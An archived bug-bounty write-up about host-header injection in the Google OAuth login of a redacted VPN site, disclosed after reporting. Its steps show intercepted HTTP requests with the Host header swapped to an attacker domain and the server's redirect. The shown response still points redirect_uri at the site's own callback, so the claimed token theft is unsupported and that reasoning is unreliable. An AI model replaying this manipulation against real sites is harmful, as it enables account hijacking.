# Unveiling Vulnerabilities

- **Source URL:** https://medium.com/@iamxali/unveiling-vulnerabilities-host-header-injection-in-oauth-functionality-4ec80557ada7?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251126142452/https://medium.com/@iamxali/unveiling-vulnerabilities-host-header-injection-in-oauth-functionality-4ec80557ada7
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/3612 (id 3612)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Unveiling Vulnerabilities: Host-header injection in OAuth Functionality

## Introduction

In the ever-evolving landscape of cybersecurity, the art of identifying vulnerabilities in web applications remains indispensable. During a recent penetration test, I stumbled upon a critical security flaw known as **Host-Header Injection.** In this article, I’ll guide you about host-header injection vulnerability, its impact, and how I discovered this critical security flaw in a Germany-based website.

**What is a Host-Header Injection Vulnerability?**

A host-header injection is a type of attack that aims to exploit the way web applications handle the `host`header found in an **HTTP** request. The `host`header specifies the domain name of the target server to which the client is sending the request. Take a look at the example below:

In the above example, the `host` header specifies that the **HTTP** request is being sent to `facebook.com` But what if **Facebook** doesn’t properly validate the `host` header?

Well, in that case, an attacker can easily manipulate the `host` header in order to redirect the victim to a domain under their control. This is just a basic example, but in the case of a login request, this attack can be leveraged to steal a victim’s credentials. Session hijacking, Cross-site scripting (XSS), etc are other applications of the **Host-Header Injection.**

**How did I discover a Host-Header Injection Vulnerability?**A few weeks earlier, I received a private invitation from a Germany-based company to conduct a bug-hunting expedition on their website. Once the scope of my penetration testing had been established, I embarked on a systematic search for vulnerabilities across their various domains and subdomains. Below is my approach to finding a

**Host-Header Injection flaw.**

**Steps-To-Reproduce**

As this is a private program, which means that I’m not intended to disclose the company’s domain. Let’s consider the domain name as `vpn.redacted.com`


When searching for vulnerabilities on [https://vpn.redacted.com/](https://vpn.redacted.com/)**Single-sign-on (SSO)** feature.

Single-sign-on (SSO) is a security mechanism that enables users to access multiple applications or services with a single set of login credentials. Instead of requiring users to remember and enter separate usernames and passwords for each application.


1. When clicked on the `Sign in with Google` button, An **HTTP** request appeared:

```
GET /sso/request HTTP/2
Host: vpn.redacted.com
User-Agent: ******
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://vpn.redacted.com/login
Upgrade-Insecure-Requests: 1
```
2\. By using a web proxy (Burp Suite) I intercepted the **HTTP** request and modified the **Host-Header** to `www.controlledbyme.com`

```
GET /sso/request HTTP/2
Host: www.controlledbyme.com
User-Agent: ******
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://vpn.redacted.com/login
Upgrade-Insecure-Requests: 1
```
3\. When I forwarded the request to the web server, it responded in a 302-Found

```
HTTP/2 302 Found
Content-Type: text/html; charset=utf-8
Date: Sun, 23 Jul 2023 05:57:11 GMT
Location: https://accounts.google.com/o/oauth2/auth?access_type=offline&approval_prompt=force&client_id=***.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fauth.redacted.com%2Fcallback%2Fgoogle&response_type=code&scope=profile+email&state=******
Strict-Transport-Security: max-age=31536000
X-Frame-Options: DENY
Content-Length: 935
```
At this point, what an attacker would do is copy the value of the `Location: https://accounts.google.com/o/oauth2/auth?access_type=offline&approval_prompt=force&client_id=***.apps.googleusercontent.com&redirect_uri=https://auth.redacted.com/callback/google&response_type=code&scope=profile+email&state=***`header and send it over to the victim.

4\. When the victim authorizes and upon completion of the OAuth flow, his OAuth token and verifier are sent to the attacker-controlled domain or for the sake of demonstration `www.controlledbyattacker.com`

5\. From here the attacker can harvest the login tokens and sign in to the VPN service as the victim.

**Impact**If an attacker were to successfully exploit this vulnerability, they could steal the victim’s login token and use it to log into the VPN service from the victim’s account. This can have a great impact on the confidentiality of the user’s private data.

**Conclusion**

I immediately reported this bug to the concerned team. They rated this bug as a severity level **Medium** and paid me $450.

The journey from a private invitation to a Germany-based company’s website to the identification of the Host-Header Injection vulnerability highlights the vital role of penetration testing in modern cybersecurity. This experience underscores the need for ongoing diligence, collaboration, and proactive measures to ensure digital defenses remain robust and effective.

Below is a link to a similar bug report:

[https://hackerone.com/reports/317476](https://hackerone.com/reports/317476)
